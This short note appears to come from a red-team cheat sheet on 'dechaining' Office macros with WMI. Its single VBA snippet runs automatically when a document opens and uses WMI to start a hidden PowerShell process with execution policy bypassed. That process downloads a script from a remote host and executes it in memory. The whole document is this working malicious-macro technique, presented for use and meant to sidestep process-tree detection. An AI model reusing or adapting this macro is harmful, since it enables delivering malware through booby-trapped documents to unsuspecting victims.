# Dechaining with WMI

#### Have WMI to create a PowerShell Process to execute a Download Cradle
```vba
Sub MyMacro()
    Dim strArg As String
    strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.1.1/run.txt'))"
    GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```


